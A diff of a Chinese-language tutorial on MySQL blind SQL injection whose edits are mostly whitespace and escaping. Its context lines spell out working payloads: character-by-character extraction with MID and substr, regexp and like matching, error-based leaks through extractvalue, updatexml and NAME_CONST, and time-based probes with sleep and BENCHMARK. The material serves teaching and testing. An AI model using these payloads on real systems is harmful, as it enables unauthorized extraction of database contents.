@@ -12,7 +12,7 @@ start：必需。规定开始位置（起始值是 1）。
 length：可选。要返回的字符数。如果省略，则 MID() 函数返回剩余文本。  
 Eg:      str="123456"     mid(str,2,1)    结果为2  
 Sql用例：  
->（1）MID(DATABASE(),1,1)>’a’,查看数据库名第一位，MID(DATABASE(),2,1)查看数据库名第二位，依次查看各位字符。
+>（1）MID(DATABASE(),1,1)>’a’,查看数据库名第一位，MID(DATABASE(),2,1)查看数据库名第二位，依次查看各位字符。  
 >（2）MID((SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE T table_schema=0xxxxxxx LIMIT 0,1),1,1)>’a’此处column_name参数可以为sql语句，可自行构造sql语句进行注入。  
 
  **substr()函数**  
@@ -64,9 +64,8 @@ Explain：正则表达式的用法，user()结果为root，regexp为匹配root�
 但是这种做法是错误的，limit作用在前面的select语句中，而不是regexp。那我们该如何选择。其实在regexp中我们是取匹配table_name中的内容，只要table_name中有的内容，我们用regexp都能够匹配到。因此上述语句不仅仅可以选择user，还可以匹配其他项。即，table_name中包含了所有的表名，除了匹配到user表之外，还可以继续匹配其他表，只需更改匹配规则即可。
 
 **▲like匹配注入**  
-和上述的正则类似，mysql在匹配的时候我们可以用ike进行匹配。
-用法：select user() like ‘ro%’
-
+和上述的正则类似，mysql在匹配的时候我们可以用ike进行匹配。  
+用法：select user() like ‘ro%’  
 
 ## 基于报错的SQL盲注------构造payload让信息通过错误提示回显出来
 **▲floor  rand  group by**  
@@ -107,7 +106,7 @@ mysql> SELECT @t1:=(@t2:=1)+@t3:=4,@t1,@t2,@t3;
 报错会从遇到的第一个特殊字符处开始报错.直到结束.但是报错的长度是有限制的.  
 
 MariaDB [information_schema]> select extractvalue(1,concat(0x7e,(select @@version),0x7e));
-ERROR 1105 (HY000): XPATH syntax error: '~10.1.9-MariaDB~'
+ERROR 1105 (HY000): XPATH syntax error: '\~10.1.9-MariaDB\~'
 
 **▲updatexml(1,concat(0x7e,(select @@version),0x7e),1)**   //mysql对xml数据进行查询和修改的xpath函数，xpath语法错误  
 **▲select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x;**  
@@ -125,7 +124,7 @@ mysql> SELECT NAME_CONST('myname', 14);
 ```
 
 ## 基于时间的SQL盲注----------延时注入  
-**▲If(ascii(substr(database(),1,1))>115,0,sleep(5))%23 **  //if判断语句，条件为假，执行sleep  
+**▲If(ascii(substr(database(),1,1))>115,0,sleep(5))%23**           //if判断语句，条件为假，执行sleep  
 **▲UNION SELECT IF(SUBSTRING(current,1,1)=CHAR(119),BENCHMARK(5000000,ENCODE(‘MSG’,’by 5 seconds’)),null) FROM (select database() as current) as tb1;**   
 
 //BENCHMARK(count,expr)用于测试函数的性能，参数一为次数，二为要执行的表达式。可以让函数执行若干次，返回结果比平时要长，通过时间长短的变化，判断语句是否执行成功。这是一种边信道攻击，在运行过程中占用大量的cpu资源。推荐使用sleep()
